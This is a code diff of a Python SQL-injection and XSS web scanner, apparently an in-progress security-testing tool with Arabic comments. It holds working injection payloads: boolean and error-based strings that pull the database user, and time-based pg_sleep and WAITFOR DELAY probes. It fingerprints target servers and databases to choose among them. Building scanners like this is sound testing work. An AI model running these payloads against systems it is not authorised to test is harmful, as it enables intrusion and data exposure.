@@ -12,7 +12,6 @@ from copy import deepcopy
 from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
-import json
 
 # --- Default Config / payloads ---
 SQL_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", " OR 1=1--"]
@@ -32,10 +31,6 @@ TIMEOUT = 10
 REPORT_FILE = "report.txt"
 REPORT_JSON = "report.json"
 AUTO_VERIFY = False
-LENGTH_DIFF_THRESHOLD = 0.30  # can be overridden by --len-threshold
-
-# (3) حد أقصى لتجارب حقن الهيدرز لتفادي انفجار النتائج
-MAX_HEADER_TRIES = 6
 
 # --- Phase 3: Global Rate Limiter ---
 class RateLimiter:
@@ -88,34 +83,18 @@ def request_with_timeout(method, url, params=None, data=None, headers=None, json
 
 def baseline_response(method, url, params=None, data=None, headers=None, json_body=None):
     """
-    Returns: (status_code, text, headers_dict) or (None, None, None) on failure
+    Returns: (status_code, text, headers(dict)) or (None, None, None) on failure
     """
     r = request_with_timeout(method, url, params=params, data=data, headers=headers, json_body=json_body)
     if not r:
         return None, None, None
+    # normalize headers to dict of str
+    hdrs = {}
     try:
         hdrs = {k: v for k, v in r.headers.items()}
     except Exception:
         hdrs = {}
-    return r.status_code, (r.text or ""), hdrs
-
-# (4) تنقية الاستجابة قبل المقارنة لتقليل الضجيج من أجزاء ديناميكية
-DYNAMIC_PATTERNS = [
-    r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z",  # ISO timestamps
-    r"\b[0-9a-f]{8,64}\b",                    # hashes/uuids
-    r"\b\d{2,6}\b",                           # أرقام قصيرة شائعة
-]
-
-def normalize_response(text: str) -> str:
-    if not text:
-        return ""
-    t = text
-    for pat in DYNAMIC_PATTERNS:
-        try:
-            t = re.sub(pat, "", t, flags=re.IGNORECASE)
-        except re.error:
-            continue
-    return t
+    return r.status_code, r.text or "", hdrs
 
 def length_change_ratio(base_text, new_text):
     if base_text is None or new_text is None:
@@ -125,176 +104,127 @@ def length_change_ratio(base_text, new_text):
         return abs(n)
     return abs(n - b) / b
 
-# --- Phase 4: Fingerprinting & Payload tuning ---
+# --- Phase 4: Fingerprinting & Payload Sets ---
 FINGERPRINT_RULES = {
     "server": {
-        "nginx": [r"\bnginx\b", r"openresty"],
-        "apache": [r"\bapache\b"],
-        "iis": [r"\biis\b", r"microsoft-iis"]
+        "nginx": [r"nginx", r"openresty"],
+        "apache": [r"apache"],
+        "iis": [r"iis", r"microsoft-iis"]
     },
     "language": {
-        "php": [r"\bphp\b", r"x-powered-by:\s*php"],
-        "asp.net": [r"\basp\.net\b", r"aspnet"],
-        "node": [r"\bnode\.js\b", r"x-powered-by:\s*express"],
-        "jsp": [r"\bjsp\b", r"servlet"]
+        "php": [r"php", r"x-powered-by: php"],
+        "asp.net": [r"asp.net", r"aspnet"],
+        "jsp": [r"jservlet", r"jsp"]
     },
     "database": {
-        "mysql": [r"\bmysql\b", r"mariadb"],
-        "postgresql": [r"\bpostgresql\b", r"\bpg\b"],
-        "mssql": [r"\bmicrosoft sql server\b", r"\bmssql\b"],
-        "sqlite": [r"\bsqlite\b"]
+        "mysql": [r"mysql", r"mariadb"],
+        "postgresql": [r"postgresql", r"pg"],
+        "mssql": [r"microsoft sql server", r"mssql"]
     }
 }
 
 def fingerprint_response(resp_text, resp_headers):
+    """
+    input: resp_text (str), resp_headers (dict-like)
+    return: dict with detected items (server, language, database, evidence[])
+    """
     text = (resp_text or "").lower()
-    headers_join = " ".join([f"{k}:{v}" for k, v in (resp_headers or {}).items()]).lower()
+    headers_join = " ".join([f"{k}:{v}" for k,v in (resp_headers or {}).items()]).lower()
+
     found = {"server": None, "language": None, "database": None, "evidence": []}
+
+    # search headers first (stronger signal)
     for category, rules in FINGERPRINT_RULES.items():
         for label, patterns in rules.items():
             for p in patterns:
                 try:
                     if re.search(p, headers_join) or re.search(p, text):
-                        if not found[category]:
-                            found[category] = label
+                        found[category] = label
                         found["evidence"].append(f"{category}:{label} matched /{p}/")
                         break
                 except re.error:
                     continue
             if found[category]:
                 break
+
     return found
 
 PAYLOAD_SETS = {
     "default": SQL_PAYLOADS + XSS_PAYLOADS,
-    "mysql": [
-        "' OR SLEEP(2)-- ",
-        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,USER())),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a))-- "
-    ],
-    "postgresql": [
-        "'; SELECT pg_sleep(2); --",
-        "\"; SELECT pg_sleep(2); --",
-        "' OR (SELECT version()) --",
-        "\"; SELECT version(); --"
-    ],
-    "mssql": [
-        "' AND 1=CONVERT(INT,@@version)--",
-        "\"; WAITFOR DELAY '00:00:02'--"
-    ]
+    "mysql": ["' OR SLEEP(2)-- ", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(0x7e,USER())),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))-- "],
+    "postgresql": ["' || (select version()) --", "\"; SELECT version(); --"],
+    "mssql": ["' AND 1=CONVERT(INT,@@version)--", "\"; WAITFOR DELAY '00:00:02'--"]
 }
 
-def load_payloads_json(path: str):
-    """(5) تحميل payloads مُصنَّفة من JSON: مفاتيح مثل boolean,time,error,xss"""
-    try:
-        with open(path, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        # توقع dict فيه قوائم
-        cat = {}
-        for k, v in data.items():
-            if isinstance(v, list):
-                cat[k.lower()] = [str(x) for x in v if str(x).strip()]
-        return cat
-    except Exception as e:
-        log(f"[ERROR] Could not read payloads JSON {path}: {e}")
-        return None
-
-def choose_payloads_from_categories(fingerprint, cats: dict):
-    """
-    (5) ترتيب ذكي: لِـ Postgres -> time ثم boolean ثم error ثم xss
-    وإلا: boolean -> error -> time -> xss
-    """
-    order_pg = ["time", "boolean", "error", "xss"]
-    order_def = ["boolean", "error", "time", "xss"]
-    if not cats:
-        return []
-    db = (fingerprint or {}).get("database")
-    order = order_pg if db == "postgresql" else order_def
-    out = []
-    for k in order:
-        out.extend(cats.get(k, []))
-    # إزالة التكرارات مع الحفاظ على الترتيب
-    seen = set(); uniq = []
-    for p in out:
-        if p not in seen:
-            uniq.append(p); seen.add(p)
-    return uniq
-
 def choose_payloads(fingerprint):
+    """
+    Returns a list of payloads tuned to detected DB/language, falling back to default.
+    """
     if not fingerprint:
         return PAYLOAD_SETS["default"]
     db = fingerprint.get("database")
     if db and db in PAYLOAD_SETS:
-        # DB-specific first (حتى يشتغل التحقق الزمني مبكرًا)
-        return PAYLOAD_SETS[db] + [p for p in PAYLOAD_SETS["default"] if p not in PAYLOAD_SETS[db]]
+        return PAYLOAD_SETS[db] + PAYLOAD_SETS["default"]
     lang = fingerprint.get("language")
     if lang == "asp.net":
         return PAYLOAD_SETS.get("mssql", PAYLOAD_SETS["default"]) + PAYLOAD_SETS["default"]
     return PAYLOAD_SETS["default"]
 
-def compute_score(base_confidence=10, fingerprint=None, verify_result=None, payload=None):
-    score = base_confidence
-    if fingerprint and fingerprint.get("database"): score += 10
-    if fingerprint and fingerprint.get("language"): score += 5
-    if verify_result: score += verify_result.get("score_delta", 0)
-    if payload and ("sleep" in payload.lower() or "waitfor" in payload.lower()): score += 5
-    return max(0, min(100, score))
-
-def _time_based_attempt(call_fn, attempts=3):
-    """(2) نفّذ N محاولات وقِس المتوسط (للتحقق الزمني)"""
-    delays = []
-    ok_resp = None
-    for _ in range(max(1, attempts)):
-        t0 = time.time()
-        r = call_fn()
-        dt = time.time() - t0
-        delays.append(dt)
-        ok_resp = r
-    avg = sum(delays) / len(delays)
-    return ok_resp, avg
-
+# --- Verification/Scoring helpers (Phase 4) ---
 def verify_vuln(method, url, param_name, original_params, post_data, headers,
-                json_body=None, json_key=None, base_text="", detected_type=None, fingerprint=None):
-    # (2) time-based for Postgres مع retries ومتوسط زمن
+                json_body=None, json_key=None, base_text="", detected_type=None):
+    """
+    Wrapper that uses existing auto_verify functions to return a verify_result dict:
+    { verified: bool, evidence: str, score_delta: int, elapsed: float }
+    """
     try:
-        db = (fingerprint or {}).get("database")
-        if detected_type == "SQLi" and db == "postgresql":
-            tb_payload = "'; SELECT pg_sleep(2); --"
-            parsed = urlparse(url)
-            if json_body is not None and json_key is not None:
-                def _call():
-                    jb = deepcopy(json_body); jb[json_key] = tb_payload
-                    return request_with_timeout(method, url, headers=headers, json_body=jb)
-                r, avg = _time_based_attempt(_call, attempts=3)
-            else:
-                def _call():
-                    p = deepcopy(original_params) if original_params else {}
-                    key = param_name if param_name is not None else "_scantest"
-                    p[key] = [tb_payload]
-                    q = urlencode({k: v[0] for k, v in p.items()}, doseq=False)
-                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))
-                    return request_with_timeout(method, test_url, headers=headers)
-                r, avg = _time_based_attempt(_call, attempts=3)
-            if r and avg > 1.5:
-                return {"verified": True, "evidence": f"time-based avg delay {avg:.2f}s", "score_delta": 45, "elapsed": avg}
-    except Exception:
-        pass
+        if detected_type == "SQLi":
+            ok = auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
+                                  json_body=json_body, json_key=json_key, base_text=base_text)
+            if ok:
+                return {"verified": True, "evidence": "auto_verify_sqli succeeded", "score_delta": 40, "elapsed": 0.0}
+            return {"verified": False, "evidence": "auto_verify_sqli failed", "score_delta": 0, "elapsed": 0.0}
+        elif detected_type == "XSS":
+            ok = auto_verify_xss(method, url, param_name, original_params, post_data, headers,
+                                 json_body=json_body, json_key=json_key)
+            if ok:
+                return {"verified": True, "evidence": "auto_verify_xss succeeded", "score_delta": 30, "elapsed": 0.0}
+            return {"verified": False, "evidence": "auto_verify_xss failed", "score_delta": 0, "elapsed": 0.0}
+        else:
+            # fallback: try both
+            ok_sql = auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
+                                      json_body=json_body, json_key=json_key, base_text=base_text)
+            ok_xss = auto_verify_xss(method, url, param_name, original_params, post_data, headers,
+                                     json_body=json_body, json_key=json_key)
+            if ok_sql:
+                return {"verified": True, "evidence": "fallback auto_verify_sqli succeeded", "score_delta": 30, "elapsed": 0.0}
+            if ok_xss:
+                return {"verified": True, "evidence": "fallback auto_verify_xss succeeded", "score_delta": 20, "elapsed": 0.0}
+            return {"verified": False, "evidence": "fallback verification failed", "score_delta": 0, "elapsed": 0.0}
+    except Exception as e:
+        return {"verified": False, "evidence": f"verify exception: {e}", "score_delta": 0, "elapsed": 0.0}
 
-    # fallback boolean verify
-    if detected_type == "SQLi":
-        ok = auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
-                              json_body=json_body, json_key=json_key, base_text=base_text)
-        return {"verified": bool(ok), "evidence": "auto_verify_sqli "+("succeeded" if ok else "failed"),
-                "score_delta": 40 if ok else 0, "elapsed": 0.0}
-    if detected_type == "XSS":
-        ok = auto_verify_xss(method, url, param_name, original_params, post_data, headers,
-                             json_body=json_body, json_key=json_key)
-        return {"verified": bool(ok), "evidence": "auto_verify_xss "+("succeeded" if ok else "failed"),
-                "score_delta": 30 if ok else 0, "elapsed": 0.0}
-    return {"verified": False, "evidence": "no specific verify", "score_delta": 0, "elapsed": 0.0}
+def compute_score(base_confidence=10, fingerprint=None, verify_result=None, payload=None):
+    """
+    Compute a score 0-100 for a finding.
+    """
+    score = base_confidence
+    if fingerprint and fingerprint.get("database"):
+        score += 10
+    if fingerprint and fingerprint.get("language"):
+        score += 5
+    if verify_result:
+        score += verify_result.get("score_delta", 0)
+    if payload and ("sleep" in payload.lower() or "waitfor" in payload.lower()):
+        score += 5
+    return max(0, min(100, score))
 
 # --- Auto-verification helpers (existing) ---
 def auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
                      json_body=None, json_key=None, base_text=""):
+    """
+    Boolean-based check by diffing true/false conditions.
+    """
     true_p = "1' OR '1'='1"
     false_p = "1' AND '1'='2"
     if json_body is not None and json_key is not None:
@@ -324,12 +254,8 @@ def auto_verify_sqli(method, url, param_name, original_params, post_data, header
 
     if not r_true or not r_false:
         return False
-    # (4) مقارنة على نص منقّى لتقليل الضجيج
-    bt = normalize_response(base_text or "")
-    t_true = normalize_response(r_true.text or "")
-    t_false = normalize_response(r_false.text or "")
-    len_diff = abs(len(t_true) - len(t_false))
-    if len_diff > max(30, int(len(bt) * 0.03)) or (t_true != t_false) or (r_true.status_code != r_false.status_code):
+    len_diff = abs(len(r_true.text or "") - len(r_false.text or ""))
+    if len_diff > max(30, int(len(base_text or "") * 0.03)) or (r_true.text != r_false.text) or (r_true.status_code != r_false.status_code):
         return True
     return False
 
@@ -363,14 +289,10 @@ def generate_header_variants(base_headers, payloads):
     if not base_headers:
         base_headers = {}
     for h in header_fields:
-        tries = 0  # (3) حد أقصى
         for pl in payloads:
-            if tries >= MAX_HEADER_TRIES:
-                break
             hcopy = deepcopy(base_headers)
             hcopy[h] = pl
             variants.append(hcopy)
-            tries += 1
     return variants
 
 # --- Core testing logic (single injection attempt) ---
@@ -409,17 +331,19 @@ def _single_injection_attempt(method, url, param_name, original_params, base_tex
     status = r.status_code
     sqlerr = is_sql_error(text)
     reflected = (payload in text)
-    # (4) استخدم النص المُنقّى لقياس الفرق
-    len_ratio = length_change_ratio(normalize_response(base_text), normalize_response(text))
+    len_ratio = length_change_ratio(base_text, text)
 
     vuln_type = None
     reason = []
     if sqlerr:
-        vuln_type = "SQLi"; reason.append("SQL error pattern")
+        vuln_type = "SQLi"
+        reason.append("SQL error pattern")
     if reflected and any(payload == x for x in XSS_PAYLOADS):
-        vuln_type = "XSS"; reason.append("payload reflected")
-    if len_ratio > LENGTH_DIFF_THRESHOLD and status == base_status and not vuln_type:
-        vuln_type = "Possible Injection"; reason.append(f"response length changed by {len_ratio*100:.1f}%")
+        vuln_type = "XSS"
+        reason.append("payload reflected")
+    if len_ratio > 0.30 and status == base_status and not vuln_type:
+        vuln_type = "Possible Injection"
+        reason.append(f"response length changed by {len_ratio*100:.1f}%")
 
     finding = None
     if vuln_type:
@@ -427,8 +351,7 @@ def _single_injection_attempt(method, url, param_name, original_params, base_tex
         if AUTO_VERIFY:
             try:
                 verify_result = verify_vuln(method, url, param_name, original_params, post_data, headers,
-                                            json_body=json_body, json_key=json_key, base_text=base_text,
-                                            detected_type=vuln_type, fingerprint=fingerprint)
+                                            json_body=json_body, json_key=json_key, base_text=base_text, detected_type=vuln_type)
             except Exception:
                 verify_result = {"verified": False, "evidence": "verify exception", "score_delta": 0}
 
@@ -453,6 +376,7 @@ def _single_injection_attempt(method, url, param_name, original_params, base_tex
             "base_len": len(base_text or ""),
             "resp_len": len(text or "")
         }
+
         msg = f"[VULN] {vuln_type} on {url} param/key '{finding['injected_param']}' payload: {payload} -- {finding['reason']} (score={score})"
         if finding["auto_verified"]:
             msg += " [AUTO-VERIFIED]"
@@ -475,19 +399,20 @@ def test_inject_all_params(method, url, params, payloads, base_text, base_status
         status = r.status_code
         sqlerr = is_sql_error(text)
         reflected = any(pl in text for pl in payloads)
-        len_ratio = length_change_ratio(normalize_response(base_text), normalize_response(text))
-        if sqlerr or (reflected and any(pl in XSS_PAYLOADS for pl in payloads)) or (len_ratio > LENGTH_DIFF_THRESHOLD and status == base_status):
+        len_ratio = length_change_ratio(base_text, text)
+        if sqlerr or (reflected and any(pl in XSS_PAYLOADS for pl in payloads)) or (len_ratio > 0.30 and status == base_status):
             vuln_type = "SQLi" if sqlerr else "Possible Multi-Param Injection"
+            # attempt verify if enabled
             verify_result = {"verified": False, "evidence": "", "score_delta": 0}
             if AUTO_VERIFY:
                 try:
-                    verify_result = verify_vuln(method, url, None, params, post_data, headers, base_text=base_text,
-                                                detected_type=vuln_type, fingerprint=fingerprint)
+                    # we can't target a single param here; fallback to generic verify
+                    verify_result = verify_vuln(method, url, None, params, post_data, headers, base_text=base_text, detected_type=vuln_type)
                 except Exception:
                     verify_result = {"verified": False, "evidence": "verify exception", "score_delta": 0}
 
             score = compute_score(base_confidence=10, fingerprint=fingerprint, verify_result=verify_result, payload=payload)
-            findings.append({
+            finding = {
                 "timestamp": now_ts(),
                 "url": url,
                 "test_url": new_url,
@@ -502,14 +427,15 @@ def test_inject_all_params(method, url, params, payloads, base_text, base_status
                 "fingerprint": fingerprint or {},
                 "score": score,
                 "status": "confirmed" if verify_result.get("verified") and score >= 50 else ("probable" if score >= 30 else "low"),
-            })
-            log(f"[VULN] Multi-param {vuln_type} on {url} payload: {payload} -- len_change={len_ratio:.2f} (score={score})")
+            }
+            findings.append(finding)
+            log(f"[VULN] Multi-param {finding['vuln_type']} on {url} payload: {payload} -- {finding['reason']} (score={score})")
     return findings
 
 # --- High level scanning for a single target (Phase 3 concurrency inside) ---
 def scan_target(url, method="GET", postdata_str=None, headers=None, json_str=None,
                 headers_inject=False, inject_all_params_flag=False, combined_payloads=None,
-                verbose=False, threads=1, payloads_categories=None):
+                verbose=False, threads=1):
     log(f"--- Scanning: {url} (method={method}) ---")
 
     parsed = urlparse(url)
@@ -526,27 +452,24 @@ def scan_target(url, method="GET", postdata_str=None, headers=None, json_str=Non
     json_body = None
     if json_str:
         try:
+            import json
             json_body = json.loads(json_str)
         except Exception as e:
             log(f"[ERROR] bad --json for {url}: {e}")
 
-    base_status, base_text_raw, base_headers = baseline_response(method, url, headers=headers, json_body=json_body, data=post_data)
+    base_status, base_text, base_headers = baseline_response(method, url, headers=headers, json_body=json_body, data=post_data)
     if base_status is None:
         log(f"[ERROR] Baseline request failed: {url}")
         return []
-    base_text = normalize_response(base_text_raw)  # (4) استخدم المنقّى كأساس
 
-    # Phase 4: fingerprint & tuned payloads
-    fingerprint = fingerprint_response(base_text_raw, base_headers)
+    # Fingerprint the target (Phase 4)
+    fingerprint = fingerprint_response(base_text, base_headers)
     if verbose:
         log(f"[INFO] Fingerprint for {url}: {fingerprint}")
 
+    # choose payloads based on fingerprint unless user provided combined_payloads explicitly
     if combined_payloads:
         payloads = combined_payloads
-    elif payloads_categories:
-        payloads = choose_payloads_from_categories(fingerprint, payloads_categories)
-        if verbose:
-            log(f"[*] Using categorized payloads ({len(payloads)})")
     else:
         payloads = choose_payloads(fingerprint)
 
@@ -587,6 +510,7 @@ def scan_target(url, method="GET", postdata_str=None, headers=None, json_str=Non
     # Execute tasks concurrently (Phase 3)
     max_workers = max(1, int(threads or 1))
     if max_workers == 1:
+        # sequential
         for kind, kwargs in tasks:
             if kind == "param":
                 f = _single_injection_attempt(**kwargs)
@@ -634,7 +558,7 @@ def load_payloads_file(path):
         return []
 
 def build_argparser():
-    parser = argparse.ArgumentParser(description="MVP SQLi/XSS scanner - Phase 2+3 + Phase 4 fingerprinting")
+    parser = argparse.ArgumentParser(description="MVP SQLi/XSS scanner - Phase 2+3 enhancements + Phase 4 fingerprinting")
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument("--url", "-u", help="Target URL to scan")
     group.add_argument("--file", help="File with list of target URLs (one per line)")
@@ -647,8 +571,6 @@ def build_argparser():
     parser.add_argument('--headers-inject', action='store_true', help='Try payloads in headers (User-Agent, Referer, X-Forwarded-For)')
     parser.add_argument('--inject-all-params', dest='inject_all_params', action='store_true', help='Inject payloads into all parameters of a request')
     parser.add_argument('--payloads', type=str, help='Path to payload file (one payload per line). If omitted, uses built-in lists.')
-    # (5) ملف JSON مُصنَّف
-    parser.add_argument('--payloads-json', type=str, help='Path to JSON payload categories (keys: boolean,time,error,xss)')
     parser.add_argument('--report-json', default='report.json', help='Path to structured JSON report')
     parser.add_argument('--report-txt', default='report.txt', help='Path to human-readable report')
 
@@ -656,13 +578,10 @@ def build_argparser():
     parser.add_argument('--threads', type=int, default=1, help='Concurrency: worker threads (>=1). Applies inside each target.')
     parser.add_argument('--delay', type=float, default=0.0, help='Global delay (seconds) between requests for throttling')
     parser.add_argument('--auto-verify', action='store_true', help='Run simple auto-verification (SQLi boolean, XSS token reflect)')
-
-    # Phase 4 tuning:
-    parser.add_argument('--len-threshold', type=float, default=0.30, help='Length diff threshold for heuristics (default 0.30)')
     return parser
 
 def main():
-    global TIMEOUT, REPORT_FILE, REPORT_JSON, AUTO_VERIFY, RATE_LIMITER, LENGTH_DIFF_THRESHOLD
+    global TIMEOUT, REPORT_FILE, REPORT_JSON, AUTO_VERIFY, RATE_LIMITER
     parser = build_argparser()
     args = parser.parse_args()
 
@@ -671,7 +590,6 @@ def main():
     REPORT_JSON = args.report_json
     AUTO_VERIFY = bool(args.auto_verify)
     RATE_LIMITER = RateLimiter(args.delay or 0.0)
-    LENGTH_DIFF_THRESHOLD = float(args.len_threshold if args.len_threshold is not None else 0.30)
 
     # prepare headers
     hdrs = {}
@@ -683,17 +601,14 @@ def main():
 
     # payloads loading
     combined_payloads = None
-    payloads_categories = None
     if args.payloads:
         pl = load_payloads_file(args.payloads)
         if pl:
             combined_payloads = pl
-            log(f"[*] Loaded {len(pl)} payloads from {args.payloads}")
-    if args.payloads_json and not combined_payloads:
-        payloads_categories = load_payloads_json(args.payloads_json)
-        if payloads_categories:
-            flat_count = sum(len(v) for v in payloads_categories.values())
-            log(f"[*] Loaded categorized payloads ({flat_count}) from {args.payloads_json}")
+            if args.verbose:
+                log(f"[*] Loaded {len(pl)} payloads from {args.payloads}")
+    if combined_payloads is None:
+        combined_payloads = None  # let scan_target choose based on fingerprint
 
     # clear report files
     open(REPORT_FILE, "w", encoding="utf-8").close()
@@ -708,7 +623,7 @@ def main():
     all_findings = []
     start = time.time()
 
-    # Concurrency across targets too
+    # Phase 3: Concurrency across targets too (uses same --threads for simplicity)
     if args.threads and args.threads > 1 and len(targets) > 1:
         with ThreadPoolExecutor(max_workers=args.threads) as ex:
             futs = []
@@ -716,8 +631,7 @@ def main():
                 futs.append(ex.submit(
                     scan_target, t, method=args.method, postdata_str=args.postdata, headers=hdrs, json_str=args.json,
                     headers_inject=args.headers_inject, inject_all_params_flag=args.inject_all_params,
-                    combined_payloads=combined_payloads, verbose=args.verbose, threads=args.threads,
-                    payloads_categories=payloads_categories
+                    combined_payloads=combined_payloads, verbose=args.verbose, threads=args.threads
                 ))
             for f in as_completed(futs):
                 try:
@@ -726,14 +640,14 @@ def main():
                     log("Interrupted by user")
                     break
                 except Exception as e:
-                    log(f"[DEBUG] target error: {e}")
+                    if args.verbose:
+                        log(f"[DEBUG] target error: {e}")
     else:
         for t in targets:
             try:
                 f = scan_target(t, method=args.method, postdata_str=args.postdata, headers=hdrs, json_str=args.json,
                                 headers_inject=args.headers_inject, inject_all_params_flag=args.inject_all_params,
-                                combined_payloads=combined_payloads, verbose=args.verbose, threads=args.threads,
-                                payloads_categories=payloads_categories)
+                                combined_payloads=combined_payloads, verbose=args.verbose, threads=args.threads)
                 all_findings.extend(f)
             except KeyboardInterrupt:
                 print("Interrupted by user")
